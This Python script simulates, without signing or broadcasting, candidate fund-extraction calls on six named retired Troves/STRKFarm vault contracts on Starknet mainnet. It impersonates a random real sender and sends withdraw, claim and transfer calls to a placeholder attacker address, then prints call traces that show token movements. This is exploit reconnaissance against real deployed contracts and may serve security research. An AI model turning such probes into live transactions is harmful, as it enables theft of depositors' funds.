#!/usr/bin/env python3
"""Simulate candidate extraction calls on the retired Troves/STRKFarm vaults.

Read-only: starknet_simulateTransactions with SKIP_VALIDATE does not sign or
broadcast anything. Sender is a random real account picked from the latest block
(unprivileged). The call tree is printed to reveal internal token transfers.
"""
import json
import sys

from rpc import block_number, felt, rpc, selector

CARTRIDGE = "https://api.cartridge.gg/x/starknet/mainnet"
PUBLICNODE = "https://starknet-rpc.publicnode.com"

VAULTS = {
    "AutoCompounding_STRK": "0x00541681b9ad63dff1b35f79c78d8477f64857de29a27902f7298f7b620838ea",
    "AutoCompounding_USDC": "0x016912b22d5696e95ffde888ede4bd69fbbc60c5f873082857a47c543172694f",
    "Sensei_STRK": "0x020d5fc4c9df4f943ebb36078e703369c04176ed00accf290e8295b659d2cea6",
    "Sensei_USDC": "0x04937b58e05a3a2477402d1f74e66686f58a61a5070fcc6f694fb9a0b3bae422",
    "Sensei_ETH": "0x9d23d9b1fa0db8c9d75a1df924c3820e594fc4ab1475695889286f3f6df250",
    "Sensei_ETH_XL": "0x9140757f8fb5748379be582be39d6daf704cc3a0408882c0d57981a885eed9",
}
ATTACKER = "0x0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcd"
USDC = "0x053c91253bc9682c04929ca02ed00b3e423f6710d2ee7e0d5ebb06f3ecf368a8"


def get_random_sender():
    blk = rpc("starknet_getBlockWithTxs", ["latest"], endpoint=CARTRIDGE)
    for t in blk.get("transactions", []):
        if t.get("type") == "INVOKE" and t.get("sender_address"):
            return t["sender_address"]
    raise RuntimeError("no sender found")


def get_nonce(addr):
    return rpc("starknet_getNonce", ["latest", felt(addr)], endpoint=CARTRIDGE)


def simulate(sender, calls, flags=("SKIP_VALIDATE", "SKIP_FEE_CHARGE"), nonce=None):
    """calls: list of (to, entry, calldata_list)."""
    calldata = [hex(len(calls))]
    for to, entry, args in calls:
        calldata += [felt(to), selector(entry), hex(len(args))] + [felt(a) if a.startswith("0x") else hex(a) for a in args]
    tx = {
        "type": "INVOKE",
        "version": "0x1",
        "sender_address": felt(sender),
        "calldata": calldata,
        "signature": [],
        "nonce": nonce if nonce is not None else get_nonce(sender),
        "max_fee": "0x0",
    }
    return rpc(
        "starknet_simulateTransactions",
        {"block_id": "latest", "transactions": [tx], "simulation_flags": list(flags)},
        endpoint=CARTRIDGE,
    )


def flatten_trace(node, depth=0, out=None):
    if out is None:
        out = []
    if not isinstance(node, dict):
        return out
    et = node.get("entry_point_type", "")
    name = node.get("entry_point_selector") or node.get("entry_point", "")
    ca = node.get("contract_address", "")
    cd = node.get("calldata", [])
    out.append("  " * depth + f"{name} @ {ca} calldata={cd[:8]}")
    for c in node.get("calls", []) or []:
        flatten_trace(c, depth + 1, out)
    return out


def main():
    sender = get_random_sender()
    print("random sender:", sender, file=sys.stderr)
    results = {}
    plan = [
        ("AC_STRK withdraw_zklend(1,attacker)", "AutoCompounding_STRK", "withdraw_zklend", [hex(1), hex(0), felt(ATTACKER)]),
        ("AC_STRK withdraw_zklend(1,zero)", "AutoCompounding_STRK", "withdraw_zklend", [hex(1), hex(0), felt("0x0")]),
        ("AC_USDC withdraw_zklend(1,attacker)", "AutoCompounding_USDC", "withdraw_zklend", [hex(1), hex(0), felt(ATTACKER)]),
        ("Sensei_USDC withdraw_zklend(1,attacker)", "Sensei_USDC", "withdraw_zklend", [hex(1), hex(0), felt(ATTACKER)]),
        ("Sensei_ETH withdraw_zklend(1,attacker)", "Sensei_ETH", "withdraw_zklend", [hex(1), hex(0), felt(ATTACKER)]),
        ("Sensei_USDC withdraw_nostra(attacker)", "Sensei_USDC", "withdraw_nostra", [felt(ATTACKER)]),
        ("Sensei_USDC claim_zklend(1,USDC,1)", "Sensei_USDC", "claim_zklend", [hex(1), hex(0), felt(USDC), hex(1), hex(0)]),
        ("Sensei_USDC set_batch_amount(1,USDC,1)", "Sensei_USDC", "set_batch_amount", [hex(1), hex(0), felt(USDC), hex(1), hex(0)]),
        ("Sensei_USDC transfer(0,1,attacker)", "Sensei_USDC", "transfer", [felt("0x0"), hex(1), hex(0), felt(ATTACKER)]),
    ]
    for label, vname, entry, args in plan:
        try:
            r = simulate(sender, [(VAULTS[vname], entry, args)])
            sim = r[0]
            trace = sim.get("transaction_trace", {})
            exec_inv = trace.get("execute_invocation", {})
            reverted = exec_inv.get("revert_reason")
            res = {
                "status": "REVERTED" if reverted else "SUCCESS",
                "revert_reason": reverted,
                "fee": sim.get("fee_estimation"),
                "trace_lines": flatten_trace(exec_inv)[:60],
            }
            results[label] = res
        except Exception as e:  # noqa: BLE001
            results[label] = {"status": "SIM_ERROR", "error": str(e)[:500]}
    print(json.dumps(results, indent=1))


if __name__ == "__main__":
    main()
